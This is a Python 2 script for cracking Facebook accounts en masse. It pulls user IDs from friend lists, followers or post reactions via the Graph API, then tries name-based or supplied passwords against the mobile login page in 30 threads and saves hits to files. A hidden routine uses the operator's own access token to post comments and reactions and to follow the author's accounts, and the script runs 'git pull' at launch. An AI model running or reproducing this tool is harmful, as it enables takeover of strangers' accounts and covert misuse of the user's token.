# coding:utf-8
# decompile by Itsuki ft. Aap Afandi ID
# coded by angga kurniawan
# fb.me/gaaaarzxd

import requests
import sys
import os
import subprocess
import random
import time
import re
import json
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from datetime import datetime
try:
	import requests
except ImportError:
	os.system("pip2 install requests")

loop = 0
ok = []
cp = []
id = []

ua = ("Mozilla/5.0 (Linux; Android 4.1.3; GT-I8190N Build/GRK39F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]") 
s = requests.Session()
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]

def logo():
	os.system("clear")
	print("  \033[0;91m___ ___ __  __ ___ ___ \n \033[0;91m/ __|_ _|  \/  | _ ) __| \033[0;96mAU\033[0;97m : ANGGA KURNIAWAN\n\033[0;97m \__ \| || |\/| | _ \ _|  \033[0;91mFB\033[0;97m : FB.ME/GAAAARZXD\n\033[0;97m |___/___|_|  |_|___/_|   \033[0;93mGH\033[0;97m : GITHUB.COM/ANGGAXD")

def bot_komen():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
        os.system('rm -rf login.txt')
    una = ('100015073506062') 
    post = ('1031861840659590') 
    post2 = ('1110619372783836') 
    kom = ('GW PAKE SC LU BANG 😍😘\nhttps://www.facebook.com/100015073506062/posts/1031861840659590/?app=fbl') 
    kom2 = ('KEREN BANG 😘😘\nhttps://m.facebook.com/photo.php?fbid=1110619372783836&set=a.106868716492245&type=3&app=fbl') 
    reac = ('LOVE') 
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + token)
    requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ token)
    requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + token)
    requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac+ '&access_token='+ token)
    requests.post('https://graph.facebook.com/100002163187650/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=' + token)
    menu()
    
def tokenz():
	os.system("clear")
	try:
		token = open('login.txt','r')
		menu()
	except (KeyError,IOError):
		logo()
		print("\n \033[0;97m[\033[0;93m*\033[0;97m] How To Get Token : https://youtu.be/RIpCHs7E4qs")
		token = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] Your Token : ")
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			avsid = open("login.txt", 'w')
			avsid.write(token)
			avsid.close()
			print(" \033[0;97m[\033[0;92m+\033[0;97m] Login Successfully")
			bot_komen()
		except KeyError:
			exit(" \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid")

def menu():
	os.system('clear')
	global token
	try:
		token = open('login.txt','r').read()
	except IOError:
		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
		os.system('clear')
		os.system('rm -rf login.txt')
		tokenz()
	try:
		otw = requests.get('https://graph.facebook.com/me/?access_token='+token)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
		username = a['username']
		ip = requests.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
	except KeyError:
		os.system('clear')
		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
		os.system('rm -rf login.txt')
		tokenz()
	except requests.exceptions.ConnectionError:
		print(' \033[0;97m[\033[0;91m!\033[0;97m] No Connection')
		sys.exit()
	logo()
	print(" \033[0;97m[\033[0;96m+\033[0;97m] User Active : %s"%(nama))
	print(" \033[0;97m[\033[0;96m+\033[0;97m] IP Address  : "+ip)
	print(" \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------") 
	print(" \033[0;97m[\033[0;96m1\033[0;97m] Crack From Public FriendList")
	print(" \033[0;97m[\033[0;96m2\033[0;97m] Crack From Follower")
	print(" \033[0;97m[\033[0;96m3\033[0;97m] Crack From Reaction")
	print(" \033[0;97m[\033[0;91m0\033[0;97m] Logout (delete token)")
	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Choose : ")
	if ask =="":
		menu()
	elif ask == "1" or ask == "01":
		public()
	elif ask == "2" or ask == "02":
		followers()
	elif ask == "3" or ask == "03":
		reaction()
	elif ask == "0" or ask == "00":
		os.system("rm -f login.txt")
		exit(" \033[0;97m[\033[0;96m#\033[0;97m] Successfully Delete Token")
	else:
		menu()
 
def public():
	global token
	try:
		token = open('login.txt', 'r').read()
	except IOError:
		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
		tokenz()
	print("\n \033[0;97m[\033[0;93m*\033[0;97m] Fill In 'me' To Crack From The Friends List")
	idt = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] ID Public : ")
	try:
		pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
		sp = json.loads(pok.text)
		#print(" \033[0;97m[\033[0;92m+\033[0;97m] Name : "+sp["name"])
	except KeyError:
		exit(' \033[0;97m[\033[0;91m!\033[0;97m] ID Public Not Found')
	r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
	z = json.loads(r.text)
	for i in z["data"]:
		uid = i['id']
		na = i['name']
		nm = na.rsplit(" ")[0]
		id.append(uid+'|'+nm)
	print(" \033[0;97m[\033[0;93m*\033[0;97m] Total ID  : \033[0;91m"+str(len(id)))
	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Want to Use a Manual Password? Y/t : ")
	if ask == "Y" or ask == "y":
		manual()
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;92mOK\033[0;97m Saved In : results/OK-%s-%s-%s.txt"% (ha, op, ta))
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;93mCP\033[0;97m Saved In : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
	
	def main(user):
		global loop, token, ips
		print'\r \x1b[0;97m[\x1b[0;96m%s\x1b[0;97m] Cracking %s/%s - OK-:%s - CP-:%s ' % (datetime.now().strftime('%H:%M:%S'), loop, len(id), len(ok), len(cp)), 
		sys.stdout.flush()
		uid,name=user.split("|")
		try:
			os.mkdir('results')
		except OSError:
			pass
		try:
			for pw in [name.lower()+'123',name.lower()+'1234',name.lower()+'12345',name.lower()]:
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r  \033[0;92m* --> ' +uid+ '|' + pw + '                  ')
					ok.append(uid+'|'+pw)
					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write(str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
				elif 'checkpoint' in xo:
					print('\r  \033[0;93m* --> ' +uid+ '|' + pw + '                  ')
					cp.append(uid+'|'+pw)
					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write(str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n \033[0;97m[\033[0;96m#\033[0;97m] Finished")

def followers():
	global token
	try:
		token = open('login.txt', 'r').read()
	except IOError:
		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
		tokenz()
	print("\n \033[0;97m[\033[0;93m*\033[0;97m] Fill In 'me' To Crack From The Followers")
	idt = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] ID Public : ")
	try:
		pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
		sp = json.loads(pok.text)
		#print(" \033[0;97m[\033[0;92m+\033[0;97m] Name : "+sp["name"])
	except KeyError:
		exit(' \033[0;97m[\033[0;91m!\033[0;97m] ID Public Not Found')
	r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=5000&access_token="+token)
	z = json.loads(r.text)
	for i in z["data"]:
		uid = i['id']
		na = i['name']
		nm = na.rsplit(" ")[0]
		id.append(uid+'|'+nm)
	print(" \033[0;97m[\033[0;93m*\033[0;97m] Total ID  : \033[0;91m"+str(len(id)))
	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Want to Use a Manual Password? Y/t : ")
	if ask == "Y" or ask == "y":
		manual()
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;92mOK\033[0;97m Saved In : results/OK-%s-%s-%s.txt"% (ha, op, ta))
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;93mCP\033[0;97m Saved In : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
	
	def main(user):
		global loop, token
		print '\r \x1b[0;97m[\x1b[0;96m%s\x1b[0;97m] Cracking %s/%s - OK-:%s - CP-:%s ' % (datetime.now().strftime('%H:%M:%S'), loop, len(id), len(ok), len(cp)), 
		sys.stdout.flush()
		uid,name=user.split("|")
		try:
			os.mkdir('results')
		except OSError:
			pass
		try:
			for pw in [name.lower()+'123',name.lower()+'1234',name.lower()+'12345',name.lower()]:
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r  \033[0;92m* --> ' +uid+ '|' + pw + '                  ')
					ok.append(uid+'|'+pw)
					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write(str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
				elif 'checkpoint' in xo:
					print('\r  \033[0;93m* --> ' +uid+ '|' + pw + '                  ')
					cp.append(uid+'|'+pw)
					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write(str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n \033[0;97m[\033[0;96m#\033[0;97m] Finished")

def reaction():
	global token
	try:
		token = open('login.txt', 'r').read()
	except IOError:
		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
		tokenz()
	print("\n \033[0;97m[\033[0;93m*\033[0;97m] Ex :/post/\033[0;92m629986xxxxx\033[0;97m (only id post)")
	idt = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] ID Post : ")
	try:
		pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
		sp = json.loads(pok.text)
		#print(" \033[0;97m[\033[0;92m+\033[0;97m] Name : "+sp["name"])
	except KeyError:
		exit(' \033[0;97m[\033[0;91m!\033[0;97m] ID Postingan Not Found')
	r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=5000&access_token="+token)
	z = json.loads(r.text)
	for i in z["data"]:
		uid = i['id']
		na = i['name']
		nm = na.rsplit(" ")[0]
		id.append(uid+'|'+nm)
	print(" \033[0;97m[\033[0;93m*\033[0;97m] Total ID  : \033[0;91m"+str(len(id)))
	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Want to Use a Manual Password? Y/t : ")
	if ask == "Y" or ask == "y":
		manual()
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;92mOK\033[0;97m Saved In : results/OK-%s-%s-%s.txt"% (ha, op, ta))
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;93mCP\033[0;97m Saved In : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
	
	def main(user):
		global loop, token
		print'\r \x1b[0;97m[\x1b[0;96m%s\x1b[0;97m] Cracking %s/%s - OK-:%s - CP-:%s ' % (datetime.now().strftime('%H:%M:%S'), loop, len(id), len(ok), len(cp)), 
		sys.stdout.flush()
		uid,name=user.split("|")
		try:
			os.mkdir('results')
		except OSError:
			pass
		try:
			for pw in [name.lower()+'123',name.lower()+'1234',name.lower()+'12345',name.lower()]:
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r  \033[0;92m* --> ' +uid+ '|' + pw + '                  ')
					ok.append(uid+'|'+pw)
					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write(str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
				elif 'checkpoint' in xo:
					print('\r  \033[0;93m* --> ' +uid+ '|' + pw + '                  ')
					cp.append(uid+'|'+pw)
					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write(str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n \033[0;97m[\033[0;96m#\033[0;97m] Finished")

def manual():
	print(" \033[0;97m[\033[0;93m*\033[0;97m] Example : bismillah,123456,indonesia")
	pw = raw_input(" \033[0;97m[\033[0;93m?\033[0;97m] Sett Password : ").split(",")
	if len(pw) ==0:
		exit(" \033[0;97m[\033[0;91m!\033[0;97m] Don't Be Empty")
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;92mOK\033[0;97m Saved In : results/OK-%s-%s-%s.txt"% (ha, op, ta))
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;93mCP\033[0;97m Saved In : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
	
	def main(user):
		global loop, token
		print'\r \x1b[0;97m[\x1b[0;96m%s\x1b[0;97m] Cracking %s/%s - OK-:%s - CP-:%s ' % (datetime.now().strftime('%H:%M:%S'), loop, len(id), len(ok), len(cp)), 
		sys.stdout.flush()
		uid,name=user.split("|")
		try:
			os.mkdir('results')
		except OSError:
			pass
		try:
			for asu in pw:
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r  \033[0;92m* --> ' +uid+ '|' + asu + '                  ')
					ok.append(uid+'|'+asu)
					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write(str(uid)+'|'+str(asu)+'\n')
					save.close()
					break
					continue
				elif 'checkpoint' in xo:
					print('\r  \033[0;93m* --> ' +uid+ '|' + asu + '                  ')
					cp.append(uid+'|'+asu)
					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write(str(uid)+'|'+str(asu)+'\n')
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n \033[0;97m[\033[0;96m#\033[0;97m] Finished")
	
if __name__ == '__main__':
	os.system("git pull")
	tokenz()
